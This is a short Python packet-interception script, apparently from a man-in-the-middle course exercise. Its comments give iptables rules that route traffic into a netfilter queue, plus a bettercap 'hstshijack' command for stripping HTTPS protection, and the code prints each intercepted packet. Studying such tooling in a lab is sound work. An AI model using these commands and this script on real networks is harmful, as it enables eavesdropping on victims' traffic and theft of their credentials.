#!/usr/bin/env python

#command 1: sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
#           sudo iptables -I INPUT -j NFQUEUE --queue-num 0
#           sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#           sudo bettercap -iface enp0s3 -caplet hstshijack/hstshijack
#command 2: sudo iptables --flush

# This application is written to test Man-in-the-Middle attack along with arp_spoof.py

import scapy.all as scapy
import netfilterqueue

def process_packet(packet):
    print("[+] Filtered packet is queued in nfq 0\n")
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())   # this line can be only used for scapy formatted data
    #print(packet)               # this line can be used to print the type of pkt and size
    #print(packet.get_payload()) # this line can be used to print raw data
    #packet.drop()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

